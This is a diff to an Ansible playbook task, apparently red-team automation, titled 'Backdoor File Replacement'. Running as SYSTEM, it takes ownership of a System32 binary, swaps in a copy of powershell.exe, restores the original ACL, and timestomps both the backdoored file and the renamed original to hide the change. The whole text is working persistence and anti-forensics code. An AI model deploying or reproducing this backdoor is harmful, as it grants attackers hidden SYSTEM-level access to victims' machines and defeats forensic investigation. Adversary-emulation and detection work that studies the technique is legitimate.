@@ -6,30 +6,30 @@
 - name: "Backdoor File Replacement for {{ target }}"
   ansible.windows.win_shell: |
     # 1. Take ownership and modify ACLs to allow replacement
-    $Acl = Get-Acl "C:\Windows\System32\{{ target }}"
-    takeown /f C:\Windows\System32\{{ target }}
-    icacls C:\Windows\System32\{{ target }} /grant administrators:F
+    $targetPath = "C:\Windows\System32\{{ target }}"
+    $Acl = Get-Acl $targetPath
+    takeown /f $targetPath
+    icacls $targetPath /grant administrators:F
     
     # 2. Backup original if backup doesn't exist
-    if (!(Test-Path "C:\Windows\System32\{{ target }}.outdated")) {
-        Move-Item "C:\Windows\System32\{{ target }}" "C:\Windows\System32\{{ target }}.outdated"
+    $backupPath = "C:\Windows\System32\{{ target }}.outdated"
+    if (-not (Test-Path $backupPath)) {
+        Move-Item $targetPath $backupPath -Force
     }
 
     # 3. Replace with PowerShell
-    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\Windows\System32\{{ target }}"
-    Set-Acl "C:\Windows\System32\{{ target }}" $Acl
+    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $targetPath -Force
+    Set-Acl $targetPath $Acl
 
-    # 4. Timestomp the new binary to match the original
-    $original_time = Get-Date "{{ file_info.stat.lastwritetime }}"
-    $target_path = "C:\Windows\System32\{{ target }}"
-    (Get-Item $target_path).CreationTime = (Get-Date "{{ file_info.stat.creationtime }}")
-    (Get-Item $target_path).LastWriteTime = $original_time
-    (Get-Item $target_path).LastAccessTime = (Get-Date "{{ file_info.stat.atime }}")
+    # 4. Timestomp
+    # Wrapping Jinja variables in quotes ensures they are treated as strings by Get-Date
+    (Get-Item $targetPath).CreationTime = Get-Date "{{ file_info.stat.creationtime }}"
+    (Get-Item $targetPath).LastWriteTime = Get-Date "{{ file_info.stat.lastwritetime }}"
+    (Get-Item $targetPath).LastAccessTime = Get-Date "{{ file_info.stat.atime }}"
 
-    $target_path = "C:\Windows\System32\{{ target }}.outdated"
-    (Get-Item $target_path).CreationTime = (Get-Date "{{ file_info.stat.creationtime }}")
-    (Get-Item $target_path).LastWriteTime = $original_time
-    (Get-Item $target_path).LastAccessTime = (Get-Date "{{ file_info.stat.atime }}")
+    (Get-Item $backupPath).CreationTime = Get-Date "{{ file_info.stat.creationtime }}"
+    (Get-Item $backupPath).LastWriteTime = Get-Date "{{ file_info.stat.lastwritetime }}"
+    (Get-Item $backupPath).LastAccessTime = Get-Date "{{ file_info.stat.atime }}"
   become: yes
   become_method: runas
   become_user: System
